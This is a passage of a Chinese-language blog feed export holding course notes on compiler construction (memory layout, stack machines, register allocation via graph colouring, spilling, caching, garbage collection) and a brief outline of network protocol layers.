class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">method</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> <span class="hljs-comment">&#123; new Bar &#125;</span><br></code></pre></td></tr></table></figure><ul><li>具有动态分配数据的语言使用堆来存储动态数据。</li><li>代码区域包含目标代码<ul><li>对于许多语言，目标代码是固定大小和只读的。</li></ul></li><li>静态区域包含具有固定地址的数据（非代码）（例如，全局数据）<ul><li>固定大小，可能是可读或可写的。</li></ul></li><li>堆栈包含每个当前活动过程的AR<ul><li><strong>每个AR通常固定大小，并且包含局部变量。</strong></li></ul></li><li>堆包含所有其他数据<ul><li>在C中，堆由malloc和free管理。</li></ul></li><li>堆和堆栈都会增长</li><li>必须注意不要互相影响</li><li>解决方案：<ul><li>将堆和堆栈顶在内存的两端，然后让它们彼此靠近：</li></ul></li></ul><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042410.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="对齐">对齐</h2><p>大多数现代机器：32/64 bit</p><p>1 byte = 8 bits</p><p>1 word = 4 or 8 bytes</p><p>一般机器要么是按字节要么按字寻址</p><p>按字对齐：</p><p>example：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs axapta">[h e l l o ? ? ?][<span class="hljs-keyword">next</span> data]<br>add <span class="hljs-number">3</span> padding characters to the string<br><br>[<span class="hljs-built_in">byte</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">byte</span> ?    ?   ?]<br><span class="hljs-keyword">this</span>, word aligned <span class="hljs-keyword">if</span> <span class="hljs-keyword">next</span> data begin <span class="hljs-keyword">from</span> here,<br>      <span class="hljs-keyword">this</span>, not word aligned <span class="hljs-keyword">if</span> <span class="hljs-keyword">next</span> data begin <span class="hljs-keyword">from</span> here,<br></code></pre></td></tr></table></figure><h2 id="计算模型堆栈机寄存器">计算模型：堆栈机&amp;寄存器&amp;</h2><p>堆栈机唯一的存储就是堆栈</p><ul><li>指令 $ r = F(a_1, a_2, ..., a_n) $<ul><li>从堆栈中弹出n个操作数</li><li>使用操作数计算操作F</li><li>将结果r压入堆栈</li></ul></li><li>考虑如下两条指令<ul><li>push i: 将整数i堆入堆栈</li><li>add: 相加两个整数</li></ul></li></ul><p>🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs none">push 1<br>push 2<br>push 3<br>add<br></code></pre></td></tr></table></figure><figure><imgsrc="https://upload-images.jianshu.io/upload_images/18574033-6cbe4fae0a21d2f2.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/1090/format/webp"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>累加器机，英文为“AccumulatorMachine”，是一种寄存器，用来存储计算产生的中间结果。累加器机模型是一种古老的计算模型，仅能够支持单一值的累加寄存器单元，因此，基于累加器机模型设计的指令都只支持一个操作数</p><p>寄存器机，英文为 RegisterMachine，也译为暂存器机，这种计算模型的机器，使用特定的 CPU寄存器组，来作为指令执行过程中数据存储和交换的容器。</p><p>在寄存器中，由于每一条参与到数据交换和处理的指令，都需要显示地标记操作数所在的寄存器，相较于堆栈机和累加器机，指令更长，但也更加灵活。</p><p>堆栈机使用栈结构作为数据存储与交换的容器，由于其“先进后出”的特性，无法直接操作位于栈底的数据，因此，在特殊情况下，机器会使用额外的指令来进行栈数据的交换过程，从而损失一定的执行效率。但另一方面，堆栈机模型实现简单，指令代码长度适中。</p><p>累加器机由于只有一个累加器寄存器可用于存储数据，因此在指令的执行过程中，可能会频繁请求机器的线形内存，从而导致一定的性能损耗。但另一方面，该模型最多只能有一个操作数，因此对应的指令代码较为精简。</p><p>寄存器机内大多数与数据操作相关的指令，都需要在执行时指定目标寄存器，因此，指令代码的长度较长。寄存器机拥有更多的数据暂存容器，一方面，灵活的数据操作导致寄存器的分配和使用规则变得复杂，另一方面，在使用得当的情况下，同样的计算逻辑，基于寄存器机模型，可以生成更为高效的指令执行结构。</p><p>纯堆栈机和纯寄存器机之间有一个中间点：n寄存器堆栈机</p><p>从概念上讲，将纯堆栈机堆栈的前n个位置保留在寄存器中。当n=1的时候，该寄存器演变成了累加器机</p><ul><li><p>在纯堆栈机中</p><ul><li>一次add执行三次内存操作；</li><li>两次读取，一次写入堆栈。</li></ul></li><li><p>在1寄存器堆栈计算机中，add运算符只要使用如下方式即可：</p><ul><li>acc &lt;- acc + top_of_stack，acc即累加器寄存器</li></ul></li><li><p>考虑一个表达式op(e1,…,en)</p><ul><li>注意e1,…,en是子表达式。</li><li>对于每个ei(0&lt;i&lt;n)<ul><li>计算ei；</li><li>将结果压入堆栈。</li></ul></li><li>从堆栈中弹出n−1个值，计算op</li><li>将结果存储在累加器中。</li></ul></li><li><p>对表达式e求值后，累加器将保留e的值，并且堆栈剩余部分不变。</p></li></ul><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042413.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/06/03/%E5%9B%9B%E5%B1%82%EF%BC%9A%E6%AF%8F%E4%B8%80%E5%B1%82%E9%83%BD%E4%B8%BA%E4%B8%8A%E5%B1%82%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%8D%E5%8A%A1/"/>
    <url>/emocoder/2023/06/03/%E5%9B%9B%E5%B1%82%EF%BC%9A%E6%AF%8F%E4%B8%80%E5%B1%82%E9%83%BD%E4%B8%BA%E4%B8%8A%E5%B1%82%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>四层：每一层都为上层提供了服务</p><p>Application：双向可靠的字节流(using application-specificsemantics)</p><p>Transport: 保证了数据正确，有序，以及拥塞控制</p><p>Network: 不能保证数据的有序正确，不损坏，from ,to</p><p>Link: 节点之间的数据传播</p><p>IP：瘦身层，因为底层可以有很多（http, smtp, ssh,ftp），上层也是，比如网络层（tcp, rtp, udp），应用层（ethernet, wifi,dsl, sg）,但是网络层只有一种协议: IP</p><p>OSI7层标准</p><p>网络层（最重要）：主要是Internet protocol（IP）</p><p><strong>路由器：</strong></p><p>每个端口都有自己的mac地址</p><p>具有存储局部路由的功能</p><p>具有转发数据包的功能</p><p><strong>交换机：</strong></p><p>没有mac地址</p><p>只能存储全局的mac映射表，随着网络的接入，会越来越大</p><p>可以根据mac映射表，转发给指定主机</p><p><strong>集线器：</strong></p><p>为了解决只有电脑的简单网络时代的互联网之间的连接问题</p><p>没有mac地址，</p><p>没有存储任何表</p><p>仅仅通过广播寻找目的地址</p><p><ahref="https://blog.csdn.net/qq_44807642/article/details/103054914">(306条消息)【动图讲解】计算机网络之回退N步与选择重传_选择重传和回退n步_岳麓山下你和我的博客-CSDN博客</a></p><p>​</p><ul><li>Introduction<ul><li>引言</li><li>网络中的设计模式</li><li>字节顺序</li><li>IPv4</li><li>最长前缀匹配</li><li>地址解析协议</li><li>总结</li></ul></li><li>传输层协议<ul><li>TCP</li><li>UDP</li><li>端到端原则</li><li>错误检测</li><li>网络中的确定性有限状态机</li><li>停止等待协议</li><li>滑动窗口</li><li>可靠策略一(重传)</li><li>可靠策略二(TCPh header)</li><li>可靠策略一(连接与拆卸)</li><li>总结</li></ul></li><li>分组交换</li><li>拥塞控制</li><li>应用层协议</li><li>路由</li><li>物理层协议</li><li>网网络安全与加密</li><li>前沿话题</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 10 Register Allocation</title>
    <link href="/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81/"/>
    <url>/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81/</url>
    
    <content type="html"><![CDATA[<h2 id="引入">引入</h2><p>中间代码使用了无限制的临时变量</p><ul><li>简化了代码生成和优化</li><li>复杂了向汇编转换的过程</li></ul><p>实际情况寄存器是有限的，不能无限制的使用，所以在向汇编转换的时候使用有限的寄存器。</p><blockquote><p>Register allocation is as old as compilers</p><ul><li>Register allocation was used in the original FORTRAN compiler in the‘50s</li><li>Very crude algorithms</li></ul><p>A breakthrough came in 1980 – Register allocation scheme based ongraph coloring – Relatively simple, global and works well inpractice</p></blockquote><p><strong>思路：</strong></p><ul><li>将多个临时变量分配给同一个寄存器</li><li>同时不改变原来的语义</li></ul><p>考虑如下程序：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span> := c + d<br>e := <span class="hljs-selector-tag">a</span> + <span class="hljs-selector-tag">b</span><br>f : = e - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>如果仅仅使用三个寄存器的话，这里假设a和e在使用完之后立马dead：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-built_in">r1</span> := <span class="hljs-built_in">r2</span> + <span class="hljs-built_in">r3</span><br><span class="hljs-built_in">r1</span> := <span class="hljs-built_in">r1</span> + <span class="hljs-built_in">r4</span><br><span class="hljs-built_in">r1</span> := <span class="hljs-built_in">r1</span> - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>给众多的临时变量分配有限的寄存器并且相互不冲突这是重中之重：</p><ul><li>如果在程序在某个运行点临时变量t1和t2不同时存活，那么t1和t2可以共享相同的寄存器</li><li>否则，t1和t2不能同时分配给一个寄存器</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520152040397.png"alt="image-20230520152040397" /><figcaption aria-hidden="true">image-20230520152040397</figcaption></figure><p>基于之间的活跃变量分析构建无向图(寄存器干扰图, RIG)：</p><ul><li>节点是临时变量</li><li>边表示这两个节点对应的变量同时在某个时刻存活</li><li>如果节点之间没有边，说明节点可以共享一个寄存器</li></ul><p>如下：</p><ul><li>例如，b和c不能在同一寄存器中</li><li>例如，b和d可以在同一寄存器中</li></ul><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week8%20P2/2021050602.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><blockquote><p>RIG构建完成后，寄存器分配算法与体系架构无关，不依赖任何机器属性</p></blockquote><h2 id="图染色">图染色</h2><p>图着色是对节点的颜色分配，使得通过边连接的节点具有不同的颜色</p><p>如果一个图可以用k种颜色按照上述规则着色，则该图形为k−colorable（这里的颜色就是寄存器，k为寄存器数量）</p><p>进一步的，如果RIG是k−colorable，则存在不超过k个寄存器的寄存器分配。</p><p>图染色算法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The following works well <span class="hljs-keyword">in</span> practice:<br>  – Pick <span class="hljs-keyword">a</span> node t <span class="hljs-keyword">with</span> fewer than k neighbors<br>  – Put t <span class="hljs-keyword">on</span> <span class="hljs-title">a</span> <span class="hljs-title">stack</span> <span class="hljs-title">and</span> <span class="hljs-title">remove</span> <span class="hljs-title">it</span> <span class="hljs-title">from</span> <span class="hljs-title">the</span> <span class="hljs-title">RIG</span><br>  – Repeat <span class="hljs-keyword">until</span> <span class="hljs-keyword">the</span> graph has <span class="hljs-literal">one</span> node<br>Assign colors <span class="hljs-built_in">to</span> nodes <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">stack</span><br>  – Start <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> node added<br>  – At <span class="hljs-keyword">each</span> step pick <span class="hljs-keyword">a</span> color different <span class="hljs-built_in">from</span> those assigned<br>  <span class="hljs-built_in">to</span> already colored neighbors<br></code></pre></td></tr></table></figure><p>下面这张图里第四个才符合题意</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week8%20P2/2021050704.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="变量溢出">变量溢出</h2><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520152930506.png"alt="image-20230520152930506" /><figcaption aria-hidden="true">image-20230520152930506</figcaption></figure><p>在这种情况下，我们无法将所有值都保存在寄存器中，这个时候会选择一些变量放入内存；其他变量继续图染色，这些溢出的变量将会有以下操作：</p><p><strong>选择哪些变量溢出呢？</strong></p><p>可能的启发式方法：</p><ul><li>spill冲突最多的临时变量（这个时候边比较多）</li><li>spill定义和用途很少的临时变量（因为很少用，放到内存里，也无伤大雅）</li><li>在内部循环中避免spill（因为循环里一直会复用缓存或者寄存器，如果spill了变量到内存，可能会很大程度降低运行速度，见下面缓存部分）</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Before</span> <span class="hljs-keyword">each</span> operation that reads f, <span class="hljs-keyword">insert</span><br>f := <span class="hljs-keyword">load</span> fa<br><span class="hljs-keyword">After</span> <span class="hljs-keyword">each</span> operation that writes f, <span class="hljs-keyword">insert</span><br>store f, fa<br></code></pre></td></tr></table></figure><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520152957854.png"alt="image-20230520152957854" /><figcaption aria-hidden="true">image-20230520152957854</figcaption></figure><p>重新计算活跃变量：</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520153015201.png"alt="image-20230520153015201" /><figcaption aria-hidden="true">image-20230520153015201</figcaption></figure><blockquote><p>New liveness information is almost as before</p><p>​ – Note f has been split into three temporaries</p><p>fi is live only</p><p>​ – Between a fi := load fa and the next instruction</p><p>​ – Between a store fi, fa and the preceding instr.</p><p>Spilling reduces the live range of f</p><p>​ – And thus reduces its interferences</p><p>​ – Which results in fewer RIG neighbors</p></blockquote><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520153209988.png"alt="image-20230520153209988" /><figcaption aria-hidden="true">image-20230520153209988</figcaption></figure><h2 id="管理缓存">管理缓存</h2><p>缓存的速度介于寄存器和内存中间，可作为缓冲存在，如果没有缓冲的话，寄存器和内存直接交互，由于访问内存的速度远远小于访问寄存器的速度，这样整个程序会是相对较慢的，所以缓存很重要；</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520151753508.png"alt="image-20230520151753508" /><figcaption aria-hidden="true">image-20230520151753508</figcaption></figure><p>通常情况下，寄存器和内存交互的值，会放在缓存里，每次寄存器访问数据先去缓存里查找，如果没有，才去内存里查找，如果缓存一直没有命中，那么缓存也就失去了它的价值。</p><ul><li>编译器非常擅长管理寄存器<ul><li>比程序员要好得多</li></ul></li><li>但是编译器不善于管理缓存<ul><li>这个问题仍然留给程序员</li><li>尚有一个未解决的问题，编译器可以做些什么来提高缓存性能</li></ul></li></ul><p>考虑如下程序：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span>(j := <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">10</span>; j++)<br><span class="hljs-attribute">for</span>(i=<span class="hljs-number">1</span>; i&lt;<span class="hljs-number">1000000</span>; i++) <br><span class="hljs-attribute">a</span>[i] *= b[i]<br></code></pre></td></tr></table></figure><p>上面的代码由于内部循环很大，而且每次i都会变化，如果缓存没有足够的大小，那么a[i]和b[i]就一直命中不了缓存；相反，下面的代码在10次以内，一定都是可以缓存的，速度至少比上面代码快10倍。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span>(i=<span class="hljs-number">1</span>; i&lt;<span class="hljs-number">1000000</span>; i++)<br><span class="hljs-attribute">for</span>(j := <span class="hljs-number">1</span>; j &lt; <span class="hljs-number">10</span>; j++) <br><span class="hljs-attribute">a</span>[i] *= b[i]<br></code></pre></td></tr></table></figure><p>像这种交换for循环的优化，很少有编译器实现，因为难以发现什么样的循环可以优化，事实上，大部分情况下，还是需要程序员自己去优化这种case的。</p>]]></content>
    
    
    <categories>
      
      <category>编译原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编译原理，计算机基础，cool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>斯坦福cs231(编译原理)の 11 Automatic Memory Management</title>
    <link href="/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%B8%80/"/>
    <url>/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="引出">引出</h2><p>自动内存管理也称之为垃圾回收(garbage collection)</p><p>手动管理内存有很多出乎意料的bug：</p><ul><li>忘记释放没有被使用的内存</li><li>忘记去掉一些无用引用，或者是野指针</li><li>偶然的内存覆盖</li><li>...</li></ul><p>内存相关bug很难发现(比如内存溢出，就需要排查很长时间)</p><p>🌰：</p><p>某个对象没有被引用了，但是对应的指针还在；突然后面该对象被覆盖了，但是指针仍然引用这块内存，这个时候使用这个指针的读写还是按照原来的类型进行读写，就很容易出现错误(原类型是8bit大小，现在的类型是16bit大小这种情况)</p><p>如何自动管理内存呢？</p><p>思路：当一个对象被创建的时候就会同时分配空间；但是当没有足够的空间可用的时候，是否可以复用那些没有被使用(引用)的对象的空间呢？</p><p>我们如何得知一个对象"没有被再次使用呢"</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">let</span> x: A &lt;- new A <span class="hljs-keyword">in</span> &#123; x &lt;- y; ... &#125;<br></code></pre></td></tr></table></figure><p>上面的代码里newA生成的A对象后面被覆盖了，这个A对象就是没有被再次使用的对象(这里不考虑其他代码，仅考虑本行代码)，x和y共同引用一个对象。这个A对象被称作为不可达对象</p><p>不可达对象定义，当且仅当：</p><ul><li>存在寄存器指向了对象x，或者</li><li>存在某一个可达对象y指向这个x</li></ul><p>考虑如下代码：if分支始终为True</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haxe">x &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">A</span>;<br>y &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">B</span>;<br>x &lt;- y;<br><span class="hljs-keyword">if</span> alwaysTrue() then x &lt;- <span class="hljs-keyword">new</span> <span class="hljs-type">A</span> <span class="hljs-keyword">else</span> x.foo() fi<br></code></pre></td></tr></table></figure><p>假设在<code>x &lt;- y</code> 之后，y是非活跃变量，这里：</p><ul><li>A是不可达的</li><li>B是可达的，通过x，但是B之后再也没有被使用过；</li></ul><p>所以，判断可达和不可达只是一种近似手段；</p><p>可以通过以寄存器为起点遍历引用链，寻找所有可达对象(为什么以寄存器为起点，因为只有保存在寄存器的变量才说明是参与计算的活跃的对象)，总的来说，有以下几种比较常见的垃圾回收算法：</p><ul><li>标记清除(mark and sweep)</li><li>复制转移(stop and copy)</li><li>引用计数(reference count)</li></ul><p>前两种都是内存耗尽的时候，才垃圾回收；引用计数不是等待内存耗尽的才开始进行，在没有指针指向该对象时尝试收集该对象</p><h2 id="mark-and-sweep标记清除">mark and sweep(标记清除)</h2><p>标记清除有两个步骤：</p><ul><li>the mark phase: 找到可达对象(rearchable objects)</li><li>the sweep phase: 收集可回收对象</li></ul><p>实现方式：</p><p>每个对象有一个额外的标记是否可回收的bit位</p><ul><li>该bit位初始化为0</li><li>在mark phase期间，对于所有的可达对象设置为1</li></ul><p><strong>mark phase:</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> todo = &#123;<span class="hljs-keyword">all</span> roots&#125;<br><span class="hljs-keyword">while</span> todo != 空集 <span class="hljs-keyword">do</span><br>pick v 属于 todo<br>todo &lt;- todo - &#123;v&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">mark</span>(v) == <span class="hljs-number">0</span> then<br><span class="hljs-keyword">mark</span>(v) &lt;- <span class="hljs-number">1</span><br><span class="hljs-keyword">let</span> v1, v2, ..., <span class="hljs-keyword">vn</span> <span class="hljs-keyword">be</span> the pointers contained in v<br>todo &lt;- todo 并集 &#123;v1, v2, ..., <span class="hljs-keyword">vn</span>&#125;<br>fi<br>od<br></code></pre></td></tr></table></figure><p><strong>sweep phase:</strong></p><p>清除阶段扫描堆空间里可以清除的对象(也就是比特标记仍为0的对象)，这些对象是不可达的，可以被视作"垃圾"。这些垃圾对象可以在清除阶段形成一段链表(可以避免堆内存碎片)</p><p>清除阶段过后，之前被设置为1的对象应该重置为0，方便下一次垃圾回收。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">siseof</span><span class="hljs-params">(p)</span></span> is the size of block starting at p，<span class="hljs-built_in">sizeof</span>(p)表示p对象所占据的大小，这里默认大部分情况下对象的内存布局是连续的<br><br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-attribute">bottom</span> of heap<br>while <span class="hljs-selector-tag">p</span> &lt; <span class="hljs-attribute">top</span> of heap fp<br><span class="hljs-keyword">if</span> <span class="hljs-selector-tag">mark</span>(p) == <span class="hljs-number">1</span> then<br><span class="hljs-selector-tag">mark</span>(p) &lt;- <span class="hljs-number">0</span><br><span class="hljs-keyword">else</span><br>add block <span class="hljs-selector-tag">p</span>...(<span class="hljs-selector-tag">p</span> + <span class="hljs-built_in">sizeof</span>(p) - <span class="hljs-number">1</span>) to freelist<br>fi<br><span class="hljs-selector-tag">p</span> &lt;- <span class="hljs-selector-tag">p</span> + <span class="hljs-built_in">sizeof</span>(p)<br>od<br><br>这一段代码的大概意思就是从堆的起点开始出发，直到堆的终点，如果发现p为<span class="hljs-number">1</span>，则重置为<span class="hljs-number">0</span>；否则，说明是垃圾对象，把<span class="hljs-selector-attr">[start, start + sizeof(p)]</span>的内存串到freelist链表里，在每一轮结束后，别忘了对p增加本次对象的偏移量<br></code></pre></td></tr></table></figure><p>🌰：这里假设只有一个寄存器，初始的时候寄存器指向A对象</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">root -&gt; A<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> B<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> E<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> F(<span class="hljs-number">0</span>)<br><br>标记阶段后:<br>root -&gt; A<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> B<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> E<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> F(<span class="hljs-number">0</span>)<br><br>清除阶段后:<br>root -&gt; A<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> B<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> C<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> D<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> E<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> F(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>以上普通标记-清除的缺点：</p><p>由于一旦使用该算法的时候，已经是内存不够用了，然而在<strong>标记阶段</strong>还要借用内存去维护todo这样一个数据结构，并且这个结构的大小是不受控制的，有可能有许多垃圾需要回收，这是和垃圾回收的目的相悖的</p><p><strong>改进：</strong></p><p>todo这样的数结构可否不开辟新的空间？</p><p>todo这个数据结构是为了寻找可达对象，那么可否直接遍历对象引用图，把可达对象的bit标志位设置为呢？</p><p>对图dfs遍历，但是引用是大部分情况下是单向的，如何在图里回溯(在遍历的同时反转链表，这样回溯的时候沿着反转指针即可)，这里实际操作的时候需要注意借用临时变量(寄存器)去存储当前遍历节点，以便下一个节点使用</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">cur.next</span> = tmp(反转) // 连接上一个节点<br><span class="hljs-attr">tmp</span> = cur<span class="hljs-comment">; // 现在tmp是当前节点，给下一个节点使用</span><br><span class="hljs-attr">cur</span> = cur.next<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><blockquote><p>对象在被分配的时候一般按如下规则进行分配：</p><ul><li>挑选尽量大的空间块</li><li>按需分配</li><li>顺序且连续分配，比如有100个bit大小的自左向右的连续内存空间，现在要分配50bit给某个对象，那么分配的就是前50bit</li></ul></blockquote><p>标记—清除的优势：</p><ul><li>碎片化内存，更多的使用内存碎片，减少空间利用率</li><li>对象在垃圾回收的时候不需要移动，也就是对应的指针也不会变化(这在一些允许自己手动管理内存的语言很重要，如C，C++，不会引起歧义)</li></ul><h2 id="stop-and-copy">stop and copy</h2><p>内存被划分为两块：</p><ul><li>old space: 用于分配内存</li><li>new space: 为垃圾回收备用</li></ul><p>另外有一个heap pointer, 总是指向oldspace的下一个可用空间，所以，分配内存仅仅在增加heap pointer</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520103417917.png"alt="image-20230520103417917" /><figcaption aria-hidden="true">image-20230520103417917</figcaption></figure><p>stop and copy的特点：</p><ul><li>仅仅从old space copy可达对象到newspace(所以当垃圾很多的时候，这种算法效率很高)</li><li>垃圾被留在了old space</li><li>在copy之后，new space比垃圾回收之前的old space占用的空间更少</li><li>在copy结束之后，old space和new space交换</li><li>由于需要移动scan pointer和allocpointer，和标记-清除一样，需要知道对象的大小</li><li>由于对象被移动了，函数堆栈里的相关指针必须更新</li></ul><p>每次copy之后，需要更新被copy对象内部的指针，因为其指向后续也会发生copy才对，如何让其指针引用的对象指向最新的已经copy的对象？可以在每个对象增加一个关于转移指针的字，如果对象发生了copy，那么转移指针有值且指向最新的地址，</p><blockquote><p>总结：转移指针就是存在于旧对象里指向新拷贝对象的一个指针，作用是方便后续引用该对象的指针能够根据转移指针正确更新，另外就是标记旧的对象已经被拷贝了</p></blockquote><p>所以stop and copy的目标是寻找到所有的可达对象并copy至newspace，对于当前copy对象，还需要更新其内部的所有指针</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520111956200.png"alt="image-20230520111956200" /><figcaption aria-hidden="true">image-20230520111956200</figcaption></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">while</span> scan &lt;&gt; alloc <span class="hljs-keyword">do</span><br><span class="hljs-keyword">let</span> O be the <span class="hljs-type">object</span> at scan pointer<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> pointer p contained <span class="hljs-keyword">in</span> O <span class="hljs-keyword">do</span><br>find O<span 